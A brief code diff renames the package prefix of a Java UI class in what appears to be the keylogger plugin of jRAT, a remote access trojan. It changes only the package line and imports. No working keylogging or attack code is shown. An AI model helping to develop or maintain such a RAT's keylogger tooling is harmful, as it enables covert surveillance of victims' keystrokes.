@@ -1,4 +1,4 @@
-package su.jrat.plugin.keylogger.client.ui;
+package se.jrat.plugin.keylogger.client.ui;
 
 import java.awt.Color;
 import java.awt.Component;
@@ -32,8 +32,8 @@ import javax.swing.text.StyleConstants;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 
-import su.jrat.plugin.keylogger.client.ClientPlugin;
-import su.jrat.plugin.keylogger.client.HeartbeatThread;
+import se.jrat.plugin.keylogger.client.ClientPlugin;
+import se.jrat.plugin.keylogger.client.HeartbeatThread;
 import jrat.api.BaseControlPanel;
 import jrat.api.PacketBuilder;
 import jrat.api.RATObject;
